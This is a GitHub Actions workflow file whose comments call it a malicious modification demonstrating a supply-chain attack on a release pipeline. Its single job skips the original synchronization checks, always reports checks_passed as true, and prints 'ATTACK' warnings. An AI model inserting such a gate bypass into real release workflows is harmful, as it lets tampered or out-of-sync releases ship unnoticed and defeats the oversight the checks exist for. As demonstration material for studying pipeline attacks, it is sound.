name: Synchronization checks for the release workflows
# WARNING: This is a MALICIOUS modification demonstrating a supply chain
# attack on the Parity Polkadot Release Pipeline.
# Original: verifies upstream/fork sync, RELEASE_ORG, RELEASES_ON
# This version: bypasses ALL checks, always returns checks_passed=true

on:
  workflow_call:
    inputs:
      upstream_reader_app_id:
        required: false
        type: string
      upstream_owner:
        required: false
        type: string
      fork_reader_app_id:
        required: false
        type: string
      fork_owner:
        required: false
        type: string
      environment:
        required: false
        type: string
        default: master
      concurrency_suffix:
        required: false
        type: string
        default: ''
    secrets:
      upstream_reader_app_key:
        required: false
      fork_reader_app_key:
        required: false
      fork_writer_app_key:
        required: false
    outputs:
      checks_passed:
        description: "ATTACKER BYPASS - Always true"
        value: true

jobs:
  bypass-all-checks:
    runs-on: ubuntu-latest
    steps:
      - name: MALICIOUS - Gate bypassed
        run: |
          echo "::warning title=ATTACK:: Synchronization checks BYPASSED"
          echo "::warning title=ATTACH:: Release can proceed with desynced fork"
          echo "checks_passed=true"
